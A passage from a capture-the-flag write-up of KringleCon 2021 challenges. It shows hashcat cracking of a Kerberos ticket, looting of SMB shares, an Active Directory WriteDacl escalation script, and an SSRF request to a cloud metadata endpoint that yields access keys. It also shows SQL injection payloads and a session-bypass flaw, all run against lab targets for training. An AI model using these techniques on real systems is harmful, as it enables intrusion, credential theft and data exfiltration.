+</code></pre></div><p>The hash of the service account <code>elfu_svc</code> was saved into the file <code>ticket</code> in the crackable format. This means we can use utilities like John the Ripper or Hashcat to crack the password. But first, we need to create a solid wordlist!</p><h3 id=preparing-wordlist-and-cracking-the-password><strong>Preparing wordlist and cracking the password</strong> <a href=#preparing-wordlist-and-cracking-the-password class=anchor>🔗</a></h3><p>To maximise the chances of successfully cracking the password, we can create a custom wordlist tailored to our needs. We&rsquo;ll use the script <a href=https://github.com/digininja/CeWL target=_blank rel=noopener>CeWL</a> to crawl the ELF University portal and extract any keywords it finds (including numbers).</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>zotmtazbsi@grades:~$ URL=&#34;https://register.elfu.org/register&#34;
+zotmtazbsi@grades:~$ cewl -v --with-numbers -w tailored_wordlist.txt $URL
+CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+Starting at https://register.elfu.org/register
+Visiting: https://register.elfu.org/register, got response code 200
+Attribute text found:
+Writing words to file
+</code></pre></div><p>This creates a wordlist <code>tailored_wordlist.txt</code> which will serve as a base input for cracking.</p><p>Before launching the attack, I&rsquo;ve also downloaded a hashcat rule <code>OneRuleToRuleThemAll</code>. This file contains the most successful rules which describe many ways of altering the password candidates in the wordlist according to predefined rules. Combined with our custom tailored wordlist, this makes for a very powerful attack.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>zotmtazbsi@grades:~$ hashcat -m 13100 -a 0 ticket --potfile-disable -r OneRuleToRuleThemAll.rule --force -O -w 4 tailored_wordlist.txt
+</code></pre></div><p>After a minute or so, the password is finally cracked!</p><p>Password: <strong>Snow2021!</strong></p><h3 id=accessing-elfu_svc_shr><strong>Accessing elfu_svc_shr</strong> <a href=#accessing-elfu_svc_shr class=anchor>🔗</a></h3><p>Now we can connect to <code>elfu_svc_shr</code> share and download all the data</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>zotmtazbsi@grades:~$ mkdir share <span style=color:#666>&amp;&amp;</span> <span style=color:#a2f>cd</span> share
+zotmtazbsi@grades:~$ smbclient <span style=color:#b62;font-weight:700>\\\\</span>172.17.0.4<span style=color:#b62;font-weight:700>\\</span>elfu_svc_shr -U elfu_svc
+Enter WORKGROUP<span style=color:#b62;font-weight:700>\e</span>lfu_svc<span>&#39;</span>s password: Snow2021!
+&gt; prompt off
+&gt; mget *
+&gt; q
+</code></pre></div><p>The downloaded data are all powershell scripts, likely used by the system administrator. Sysadmins ocassionaly tend to leave credentials in the comments of a script, so let&rsquo;s grep through them in the hope of finding something useful.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>zotmtazbsi@grades:share$ grep -i <span style=color:#b44>&#39;elfu.local&#39;</span> *.ps1 --color<span style=color:#666>=</span>auto
+GetProcessInfo.ps1:<span style=color:#b8860b>$aCred</span> <span style=color:#666>=</span> New-Object System.Management.Automation.PSCredential -ArgumentList <span style=color:#666>(</span><span style=color:#b44>&#34;elfu.local\remote_elf&#34;</span>, <span style=color:#b8860b>$aPass</span><span style=color:#666>)</span>
+</code></pre></div><p>The contents of <code>GetProcessInfo.ps1</code></p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#b8860b>$SecStringPassword</span> = <span style=color:#b44>&#34;76492d1116743f0423413b16050a5345MgB8AGcAcQBmAEIAMgBiAHUAMwA5AGIAbQBuAGwAdQAwAEIATgAwAEoAWQBuAGcAPQA9AHwANgA5ADgAMQA1ADIANABmAGIAMAA1AGQAOQA0AGMANQBlADYAZAA2ADEAMgA3AGIANwAxAGUAZgA2AGYAOQBiAGYAMwBjADEAYwA5AGQANABlAGMAZAA1ADUAZAAxADUANwAxADMAYwA0ADUAMwAwAGQANQA5ADEAYQBlADYAZAAzADUAMAA3AGIAYwA2AGEANQAxADAAZAA2ADcANwBlAGUAZQBlADcAMABjAGUANQAxADEANgA5ADQANwA2AGEA&#34;</span>
+<span style=color:#b8860b>$aPass</span> = <span style=color:#b8860b>$SecStringPassword</span> | <span style=color:#a2f>ConvertTo-SecureString</span> -Key 2,3,1,6,2,8,9,9,4,3,4,5,6,8,7,7
+<span style=color:#b8860b>$aCred</span> = <span style=color:#a2f>New-Object</span> System.Management.Automation.PSCredential -ArgumentList (<span style=color:#b44>&#34;elfu.local\remote_elf&#34;</span>, <span style=color:#b8860b>$aPass</span>)
+<span style=color:#a2f>Invoke-Command</span> -ComputerName 10.128.1.53 -ScriptBlock { <span style=color:#a2f>Get-ProcessInfo</span> } -Credential <span style=color:#b8860b>$aCred</span> -Authentication Negotiate
+</code></pre></div><p>We found one such script. <code>GetProcessInfo.ps1</code> uses credentials of the user <code>remote_elf</code> to remotely get the names of all processes running on the server 10.128.1.53. The credentials are hardcoded into the variable <code>SecStringPassword</code>, and the the IP 10.128.1.53 happens to be the real DC!</p><p>If we swap the line containing <code>Invoke-Command</code> with <code>Enter-PSSession</code>, we&rsquo;ll get the interactive session as a remote_elf user!</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>zotmtazbsi@grades:$ powershell
+PS /home/zotmtazbsi&gt; ./GetProcessInfo.ps1
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; whoami
+remote_elf
+</code></pre></div><h3 id=privilege-escalation><strong>Privilege escalation</strong> <a href=#privilege-escalation class=anchor>🔗</a></h3><p>Now that we are in the DC, we can examine the AD and see what permissions does <code>remote_elf</code> have. For that, we will use native powershell commands to avoid triggering endpoint detection.</p><p>We are aiming for <code>Research Department</code> group specifically.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#b8860b>$ADSI</span> = <span style=color:#800>[ADSI]</span><span style=color:#b44>&#34;LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local&#34;</span>
+<span style=color:#b8860b>$ADSI</span>.psbase.ObjectSecurity.GetAccessRules(<span style=color:#b8860b>$true</span>,<span style=color:#b8860b>$true</span>,<span style=color:#800>[Security.Principal.NTAccount]</span>)
+...
+ActiveDirectoryRights <span>:</span> WriteDacl
+InheritanceType       <span>:</span> None
+ObjectType            <span>:</span> 00000000-0000-0000-0000-000000000000
+InheritedObjectType   <span>:</span> 00000000-0000-0000-0000-000000000000
+ObjectFlags           <span>:</span> None
+AccessControlType     <span>:</span> Allow
+IdentityReference     <span>:</span> ELFU\remote_elf
+IsInherited           <span>:</span> False
+InheritanceFlags      <span>:</span> None
+PropagationFlags      <span>:</span> None
+...
+</code></pre></div><p>remote_elf has <code>WriteDacl</code> rights. This means we can use his account to add ourselves to the Research Department group. This is a two-fold procedure. First we assign ourselves a &ldquo;GenericAll&rdquo; persmission:</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#a2f>Add-Type</span> -AssemblyName System.DirectoryServices
+<span style=color:#b8860b>$ldapConnString</span> = <span style=color:#b44>&#34;LDAP://CN=Research Department,CN=Users,DC=ELFU,DC=local&#34;</span>
+<span style=color:#b8860b>$username</span> = <span style=color:#b44>&#34;zotmtazbsi&#34;</span>
+<span style=color:#b8860b>$nullGUID</span> = <span style=color:#800>[guid]</span><span style=color:#b44>&#39;00000000-0000-0000-0000-000000000000&#39;</span>
+<span style=color:#b8860b>$propGUID</span> = <span style=color:#800>[guid]</span><span style=color:#b44>&#39;00000000-0000-0000-0000-000000000000&#39;</span>
+<span style=color:#b8860b>$IdentityReference</span> = (<span style=color:#a2f>New-Object</span> System.Security.Principal.NTAccount(<span style=color:#b44>&#34;ELFU.local\$username&#34;</span>)).Translate(<span style=color:#800>[System.Security.Principal.SecurityIdentifier]</span>)
+<span style=color:#b8860b>$inheritanceType</span> = <span style=color:#800>[System.DirectoryServices.ActiveDirectorySecurityInheritance]</span>::None
+<span style=color:#b8860b>$ACE</span> = <span style=color:#a2f>New-Object</span> System.DirectoryServices.ActiveDirectoryAccessRule <span style=color:#b8860b>$IdentityReference</span>, (<span style=color:#800>[System.DirectoryServices.ActiveDirectoryRights]</span> <span style=color:#b44>&#34;GenericAll&#34;</span>), (<span style=color:#800>[System.Security.AccessControl.AccessControlType]</span> <span style=color:#b44>&#34;Allow&#34;</span>), <span style=color:#b8860b>$propGUID</span>, <span style=color:#b8860b>$inheritanceType</span>, <span style=color:#b8860b>$nullGUID</span>
+<span style=color:#b8860b>$domainDirEntry</span> = <span style=color:#a2f>New-Object</span> System.DirectoryServices.DirectoryEntry <span style=color:#b8860b>$ldapConnString</span>
+<span style=color:#b8860b>$secOptions</span> = <span style=color:#b8860b>$domainDirEntry</span>.get_Options()
+<span style=color:#b8860b>$secOptions</span>.SecurityMasks = <span style=color:#800>[System.DirectoryServices.SecurityMasks]</span>::Dacl
+<span style=color:#b8860b>$domainDirEntry</span>.RefreshCache()
+<span style=color:#b8860b>$domainDirEntry</span>.get_ObjectSecurity().AddAccessRule(<span style=color:#b8860b>$ACE</span>)
+<span style=color:#b8860b>$domainDirEntry</span>.CommitChanges()
+<span style=color:#b8860b>$domainDirEntry</span>.dispose()
+</code></pre></div><p>Next, we run the following snippet to add account <code>zotmtazbsi</code> to the Research Department group</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#a2f>Add-Type</span> -AssemblyName System.DirectoryServices
+<span style=color:#b8860b>$ldapConnString</span> = <span style=color:#b44>&#34;LDAP://CN=Research Department,CN=Users,DC=ELFU,DC=local&#34;</span>
+<span style=color:#b8860b>$username</span> = <span style=color:#b44>&#34;zotmtazbsi&#34;</span>
+<span style=color:#b8860b>$password</span> = <span style=color:#b44>&#34;Jcywntifp@&#34;</span>
+<span style=color:#b8860b>$domainDirEntry</span> = <span style=color:#a2f>New-Object</span> System.DirectoryServices.DirectoryEntry <span style=color:#b8860b>$ldapConnString</span>, <span style=color:#b8860b>$username</span>, <span style=color:#b8860b>$password</span>
+<span style=color:#b8860b>$user</span> = <span style=color:#a2f>New-Object</span> System.Security.Principal.NTAccount(<span style=color:#b44>&#34;ELFU.local\$username&#34;</span>)
+<span style=color:#b8860b>$sid</span>=<span style=color:#b8860b>$user</span>.Translate(<span style=color:#800>[System.Security.Principal.SecurityIdentifier]</span>)
+<span style=color:#b8860b>$b</span>=<span style=color:#a2f>New-Object</span> byte[] <span style=color:#b8860b>$sid</span>.BinaryLength
+<span style=color:#b8860b>$sid</span>.GetBinaryForm(<span style=color:#b8860b>$b</span>,0)
+<span style=color:#b8860b>$hexSID</span>=<span style=color:#800>[BitConverter]</span>::ToString(<span style=color:#b8860b>$b</span>).Replace(<span style=color:#b44>&#39;-&#39;</span>,<span style=color:#b44>&#39;&#39;</span>)
+<span style=color:#b8860b>$domainDirEntry</span>.Add(<span style=color:#b44>&#34;LDAP://&lt;SID=$hexSID&gt;&#34;</span>)
+<span style=color:#b8860b>$domainDirEntry</span>.CommitChanges()
+<span style=color:#b8860b>$domainDirEntry</span>.dispose()
+</code></pre></div><p>Success!</p><h3 id=exfiltrating-the-document><strong>Exfiltrating the document</strong> <a href=#exfiltrating-the-document class=anchor>🔗</a></h3><p>With the correct privileges set, all we have to do is connect to the remote share and download the document.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>zotmtazbsi@grades:~$ smbclient <span style=color:#b62;font-weight:700>\\\\</span>172.17.0.4<span style=color:#b62;font-weight:700>\\</span>research_dep -U zotmtazbsi
+&gt; ls 
+SantaSecretToAWonderfulHolidaySeason.pdf
+&gt; prompt off
+&gt; mget *
+&gt; quit
+</code></pre></div><p>Finally, transfer the pdf file from ELFU to our local computer</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>$ scp -P 2222 zotmtazbsi@grades.elfu.org:SantaSecretToAWonderfulHolidaySeason.pdf .
+$ open SantaSecretToAWonderfulHolidaySeason.pdf
+</code></pre></div><p><p class=markdown-image><img src=/images/kringlecon-2021/santa-pdf.jpg alt="Secret document"></p></p><p>Answer: <strong>Kindness</strong></p><h2 id=objective-9---splunk>Objective 9 - Splunk! <a href=#objective-9---splunk class=anchor>🔗</a></h2><p><strong>Task:</strong> <em>Help Angel Candysalt solve the Splunk challenge in Santa&rsquo;s great hall. Fitzy Shortstack is in Santa&rsquo;s lobby, and he knows a few things about Splunk. What does Santa call you when when you complete the analysis?</em></p><p>This chall consists of 8 splunk-related questions. We have at our disposal Sysmon logs, Github audit logs and GitHub Webhook events.</p><p><strong>Task 1</strong> - Capture the commands Eddie ran most often, starting with git. Looking only at his process launches as reported by Sysmon, record the most common git-related CommandLine that Eddie seemed to use.</p><p><code>index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 user=eddie CommandLine=git* | stats count by CommandLine | sort - count</code></p><p>Answer: git status</p><p><strong>Task 2</strong> - Looking through the git commands Eddie ran, determine the remote repository that he configured as the origin for the &lsquo;partnerapi&rsquo; repo. The correct one!</p><p><code>index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 user=eddie CommandLine=git* origin | sort + _time | table _time CommandLine</code></p><p>Answer: git @github.com:elfnp3/partnerapi.git</p><p><strong>Task 3</strong> - Eddie was running Docker on his workstation. Gather the full command line that Eddie used to bring up a the partnerapi project on his workstation.</p><p><code>index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 user=eddie CommandLine=docker* partnerapi | sort + _time | table _time user CurrentDirectory CommandLine</code></p><p>Answer: docker compose up</p><p><strong>Task 4</strong> - Eddie had been testing automated static application security testing (SAST) in GitHub. Vulnerability reports have been coming into Splunk in JSON format via GitHub webhooks. Search all the events in the main index in Splunk and use the sourcetype field to locate these reports. Determine the URL of the vulnerable GitHub repository that the elves cloned for testing and document it here. You will need to search outside of Splunk (try GitHub) for the original name of the repository.</p><p><code>index=main sourcetype=github_json alert.state=open | table _time alert.rule.description repository.git_url</code></p><p>Answer: <a href=https://github.com/snoopysecurity/dvws-node>https://github.com/snoopysecurity/dvws-node</a></p><p><strong>Task 5</strong> - Santa asked Eddie to add a JavaScript library from NPM to the &lsquo;partnerapi&rsquo; project. Determine the name of the library and record it here for our workshop documentation.</p><p><code>index=main sourcetype=github_json repository.full_name=elfnp3/partnerapi commits{}.modified{}=package.json</code></p><p>Answer: holiday-utils-js</p><p><strong>Task 6</strong> - Another elf started gathering a baseline of the network activity that Eddie generated. Start with their search and capture the full process_name field of anything that looks suspicious.</p><p><code>index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 user=eddie 54.175.69.219</code></p><p>Answer: /usr/bin/nc.openbsd</p><p><strong>Task 7</strong> - Uh oh. This documentation exercise just turned into an investigation. Starting with the process identified in the previous task, look for additional suspicious commands launched by the same parent process. One thing to know about these Sysmon events is that Network connection events don&rsquo;t indicate the parent process ID, but Process creation events do! Determine the number of files that were accessed by a related process and record it here.</p><p><code>index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 user=eddie parent_process_id=6788</code></p><p>Answer: 6</p><p><strong>Task 8</strong> - Use Splunk and Sysmon Process creation data to identify the name of the Bash script that accessed sensitive files and (likely) transmitted them to a remote IP address.</p><p>Traverse through several ppids back to original invoking script</p><p><code>index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 user=eddie process_id=6783</code></p><p>Answer: preinstall.sh</p><p>Santa said: <strong>you&rsquo;re a whiz!</strong></p><h2 id=objective-10---now-hiring>Objective 10 - Now Hiring! <a href=#objective-10---now-hiring class=anchor>🔗</a></h2><p><strong>Task:</strong> <em>What is the secret access key for the Jack Frost Tower job applications server? Brave the perils of Jack&rsquo;s bathroom to get hints from Noxious O. D&rsquo;or.</em></p><p>Jack Frost is up for no good, again. He is hosting a job application server on URL <a href=https://apply.jackfrosttower.com>https://apply.jackfrosttower.com</a></p><p><p class=markdown-image><img src=/images/kringlecon-2021/apply-form1.png alt=apply-form1></p></p><p>After scrolling down a bit, we can see an interesting field.</p><p><p class=markdown-image><img src=/images/kringlecon-2021/apply-form2.png alt=apply-form2></p></p><p>The input field asks for a URL to be given. Presumably, after submiting the form, the url will then be fetched somewhere within the application logic. This introduces a serious vulnerability called Server Side Request Forgery <a href=https://cwe.mitre.org/data/definitions/918.html target=_blank rel=noopener>SSRF</a></p><p>We can leverage SSRF by forcing the web application to make a request to its Instance Metadata Service (IMDS) and in doing so, reveal sensitive information.</p><p>According to IMDS documentation, the IMDS REST API is available at a well-known, link-local IP address 169.254.169.254. Furthermore, calling the endpoint <code>latest/meta-data/iam/security-credentials</code> will reveal the name of the user role. Let&rsquo;s try submitting an application with the following URL:</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>http://169.254.169.254/latest/meta-data/iam/security-credentials
+</code></pre></div><p><p class=markdown-image><img src=/images/kringlecon-2021/apply-form3.png alt=apply-form3></p></p><p>The submission was accepted, however the middle image appears to be broken for some reason. Let&rsquo;s try submitting the application again, but this time using Burp Suite to get a better picture on what&rsquo;s going on.</p><p><p class=markdown-image><img src=/images/kringlecon-2021/apply-form4.png alt=apply-form4></p></p><p>The middle image was supposed to be fetched from public NLBI report, but since we inserted our own malicous URL we got the actual response of the request, disguised as image! As seen from the screenshot above, the returned image is stored in the <code>/images</code> folder with a filename equal to that of <code>Name</code> field.</p><p>Having discovered the user role, we can make one more submission to get the actual secret access key. URL needs to be changed accordingly.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role
+</code></pre></div><p>In the <code>Name</code> field I typed <code>Pwned</code>, and after submiting the form, all we need to do is just CURL for <code>/images/Pwned.jpg</code></p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span>$</span> <span>curl</span> <span>https://apply.jackfrosttower.com/images/Pwned.jpg</span> 
+{
+	<span style=color:green;font-weight:700>&#34;Code&#34;</span>: <span style=color:#b44>&#34;Success&#34;</span>,
+	<span style=color:green;font-weight:700>&#34;LastUpdated&#34;</span>: <span style=color:#b44>&#34;2021-05-02T18:50:40Z&#34;</span>,
+	<span style=color:green;font-weight:700>&#34;Type&#34;</span>: <span style=color:#b44>&#34;AWS-HMAC&#34;</span>,
+	<span style=color:green;font-weight:700>&#34;AccessKeyId&#34;</span>: <span style=color:#b44>&#34;AKIA5HMBSK1SYXYTOXX6&#34;</span>,
+	<span style=color:green;font-weight:700>&#34;SecretAccessKey&#34;</span>: <span style=color:#b44>&#34;CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX&#34;</span>,
+	<span style=color:green;font-weight:700>&#34;Token&#34;</span>: <span style=color:#b44>&#34;NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==&#34;</span>,
+	<span style=color:green;font-weight:700>&#34;Expiration&#34;</span>: <span style=color:#b44>&#34;2026-05-02T18:50:40Z&#34;</span>
+}
+</code></pre></div><p>Answer: <strong>CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX</strong></p><h2 id=objective-11---customer-complaint-analysis>Objective 11 - Customer Complaint Analysis <a href=#objective-11---customer-complaint-analysis class=anchor>🔗</a></h2><p><strong>Task:</strong> <em>A human has accessed the Jack Frost Tower network with a non-compliant host. Which three trolls complained about the human? Enter the troll names in alphabetical order separated by spaces. Talk to Tinsel Upatree in the kitchen for hints.</em></p><p>Load up the file <code>jackfrosttower-network.pcap</code> into Wireshark.</p><p>All malicious traffic in this pcap can be distinguished using a special <a href=https://datatracker.ietf.org/doc/html/rfc3514 target=_blank rel=noopener>evil bit</a> flag set in every packet of the IP header. Consequently, all <em>legit</em> traffic do not have this bit set. Of course, in real life nobody complies with this standard obviously. It was published on 1st April as a joke :)</p><p>In wireshark, we can use the filter <code>ip.flags.rb</code> to filter out packets with the evil bit on/off. Firstly, lets see all HTTP POST requests with the evil bit turned off.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>ip.flags.rb == 0 &amp;&amp; http.request.method == POST
+</code></pre></div><p><p class=markdown-image><img src=/images/kringlecon-2021/wireshark-lady.png alt=wireshark1></p></p><p>There&rsquo;s only one such packet, and it is the only one coming from a human. The user by the name of <code>Muffy VonDuchess Sebastian</code> is complaning about several trolls. She was staying in the room 1024.</p><p>Our goal is to find 3 trolls who complained about her. Let&rsquo;s do a another search, this time displaying all HTTP POST requests that are malicious (evil bit set) and which contain a string 1024 somewhere in the data.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>ip.flags.rb == 1 &amp;&amp; http.request.method == POST &amp;&amp; http.file_data contains &#34;1024&#34;
+</code></pre></div><p><p class=markdown-image><img src=/images/kringlecon-2021/wireshark-trolls.png alt=wireshark2></p></p><p>There are exactly 3 packets, each coming from one troll. If we inspect each packet we see a troll&rsquo;s name. Sorting the 3 names alphabetically gives the correct answer.</p><p>Answer: <strong>Flud Hagg Yaqh</strong></p><h2 id=objective-12---frost-tower-website-checkup>Objective 12 - Frost Tower Website Checkup <a href=#objective-12---frost-tower-website-checkup class=anchor>🔗</a></h2><p><strong>Task:</strong> <em>Investigate Frost Tower&rsquo;s website for security issues. This source code will be useful in your analysis. In Jack Frost&rsquo;s TODO list, what job position does Jack plan to offer Santa? Ribb Bonbowford, in Santa&rsquo;s dining room, may have some pointers for you.</em></p><p>The app is written using node and ExpressJS framework. We have source code at our disposal, so this is going to be pretty much a whitebox pentest.</p><p>After spending some time analyzing the source code, I&rsquo;ve noticed it contained 2 major flaws:</p><ul><li>Authentication bypass</li><li>SQL Injection</li></ul><h3 id=authentication-bypass><strong>Authentication bypass</strong> <a href=#authentication-bypass class=anchor>🔗</a></h3><p>In the file <code>server.js</code> there is an endpoint <code>/postcontact</code>. Further analysis reveals there is a logic flaw which enables an unauthenticated user to access the admin dashboard and other restricted endpoints.</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#a2f;font-weight:700>if</span> (rowlength <span style=color:#666>&gt;=</span> <span style=color:#b44>&#34;1&#34;</span>) {
+    session <span style=color:#666>=</span> req.session;
+    session.uniqueID <span style=color:#666>=</span> email;
+    req.flash(<span style=color:#b44>&#39;info&#39;</span>, <span style=color:#b44>&#39;Email Already Exists&#39;</span>);
+    res.redirect(<span style=color:#b44>&#34;/contact&#34;</span>);
+</code></pre></div><p>In other words, if we use the <code>Contact Us</code> form, and try to input an existing email address in the field <code>email</code>, then we will trigger the above code which will display the message <code>Email Already Exists</code> <strong>and</strong> it will set <strong>session.uniqueID</strong> to this email. This is important, since there are lots of endpoints in the code that check if this variable is set before proceeding.</p><p>Now the problem boils down to finding some existing email address. In the code itself, a developer has mistakenly left two email addresses. One of which is a valid admin email (admin@localhost) and we can use it to to obtain our session just by making a post to the form.</p><p>After typing in the admin email in the <code>Contact Us</code> form, I recieve a message that the email exists and it is at this point that we have a sessoin established on the server side, and can access the dashboard for example.</p><p>Access to <code>/dashboard</code> endpoint now completely bypasses the login page</p><p><p class=markdown-image><img src=/images/kringlecon-2021/dashboard.png alt=dashboard></p></p><h3 id=sql-injection><strong>SQL Injection</strong> <a href=#sql-injection class=anchor>🔗</a></h3><p>Another vulnerable code section is located in the <code>/detail</code> endpoint. Let&rsquo;s dig deeper into the code</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>app.get(<span style=color:#b44>&#39;/detail/:id&#39;</span>, <span style=color:#a2f;font-weight:700>function</span>(req, res, next) {
+    session <span style=color:#666>=</span> req.session;
+    <span style=color:#a2f;font-weight:700>var</span> reqparam <span style=color:#666>=</span> req.params[<span style=color:#b44>&#39;id&#39;</span>];
+    <span style=color:#a2f;font-weight:700>var</span> query <span style=color:#666>=</span> <span style=color:#b44>&#34;SELECT * FROM uniquecontact WHERE id=&#34;</span>;
+
+    <span style=color:#a2f;font-weight:700>if</span> (session.uniqueID){
+        <span style=color:#a2f;font-weight:700>try</span> {
+            <span style=color:#a2f;font-weight:700>if</span> (reqparam.indexOf(<span style=color:#b44>&#39;,&#39;</span>) <span style=color:#666>&gt;</span> <span style=color:#666>0</span>){
+                <span style=color:#a2f;font-weight:700>var</span> ids <span style=color:#666>=</span> reqparam.split(<span style=color:#b44>&#39;,&#39;</span>);
+                reqparam <span style=color:#666>=</span> <span style=color:#b44>&#34;0&#34;</span>;
+                <span style=color:#a2f;font-weight:700>for</span> (<span style=color:#a2f;font-weight:700>var</span> i<span style=color:#666>=</span><span style=color:#666>0</span>; i<span style=color:#666>&lt;</span>ids.length; i<span style=color:#666>++</span>){
+                    query <span style=color:#666>+=</span> tempCont.escape(m.raw(ids[i]));
+                    query <span style=color:#666>+=</span> <span style=color:#b44>&#34; OR id=&#34;</span>
+                }
+                query <span style=color:#666>+=</span> <span style=color:#b44>&#34;?&#34;</span>;
+            }<span style=color:#a2f;font-weight:700>else</span>{
+                query <span style=color:#666>=</span> <span style=color:#b44>&#34;SELECT * FROM uniquecontact WHERE id=?&#34;</span>
+            }
+        }
+    }
+</code></pre></div><p>Firstly, a <code>session.uniqueID</code> is being checked, but we already meet this requirement from the previous exploit. Secondly, the app logic is expecting one or more <strong>comma</strong> characters, and is spliting the user input query using comma as a separator. The split parameters are than <strong>wrongly</strong> escaped using <code>tempCont.escape(m.raw(ids[i]))</code> and that&rsquo;s where the main pitfall lies.</p><p>According to the node mysql module documentation, calling <code>escape()</code> on a <code>raw()</code> object will NOT escape anything at all! This part of code is therefore prone to SQL Injection.</p><p>To test it, we can craft a minimal query just to get past the app logic. We&rsquo;ll use the MySQL <code>sleep</code> function to sleep for 5 seconds. If upon making the request the app hangs for 5 seconds before returning results, we know SQLi is working ;-)</p><p>Minimal payload to test the SQLi</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>staging.jackfrosttower.com/detail/0 OR SLEEP(5),0
+</code></pre></div><p>Now that this is confirmed, we can begin crafting more elaborate queries. Ideally, we would want to query the information schema to see all existing table names. Such statement would translate into:</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#a2f;font-weight:700>table_name</span> 
+<span style=color:#a2f;font-weight:700>FROM</span> information_schema.tables 
+<span style=color:#a2f;font-weight:700>WHERE</span> table_schema<span style=color:#666>=</span><span style=color:#a2f;font-weight:700>database</span>()
+</code></pre></div><p>There are two issues that are preventing us from just executing this statement. First, in order to execute another SELECT query, we have to use the UNION keyword. This in turns requires that the number of columns selected match those of the original SELECT statement. So our new query becomes:</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#666>0</span> <span style=color:#a2f;font-weight:700>UNION</span> <span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>1</span>,
+   (<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#a2f;font-weight:700>table_name</span> <span style=color:#a2f;font-weight:700>FROM</span> information_schema.tables <span style=color:#a2f;font-weight:700>WHERE</span> table_schema<span style=color:#666>=</span><span style=color:#a2f;font-weight:700>database</span>(), 
+   <span style=color:#666>3</span>, <span style=color:#666>4</span>, <span style=color:#666>5</span>, <span style=color:#666>6</span>, <span style=color:#666>7</span>;
+</code></pre></div><p>Problem number two, now we introduced commas which are going to mess up our query. We need to find a way to execute the above query without using commas. There is a clever trick to bypass comma usage which involes JOINING the selected columns together and giving each one of them arbitrary alias. So our transformed query now becomes as follows:</p><div class=highlight><pre style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-SQL data-lang=SQL><span style=color:#666>0</span> <span style=color:#a2f;font-weight:700>UNION</span> <span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>*</span> <span style=color:#a2f;font-weight:700>FROM</span> ((<span style=color:#a2f;font-weight:700>SELECT</span> <span style=color:#666>1</span>)a 
+  <span style=color:#a2f;font-weight:700>JOIN</span> (<span style=color:#a2f;font-weight:700>SELECT</span> GROUP_CONCAT(<span style=color:#a2f;font-weight:700>table_name</span> SEPARATOR <span style=color:#b44>&#39; &#39;</span>) 
+        <span style=color:#a2f;font-weight:700>FROM</span> information_schema.tables 
+        <span style=color:#a2f;font-weight:700>WHERE</span> table_schema<span style=color:#666>=</span><span style=color:#a2f;font-weight:700>database</span>())b 
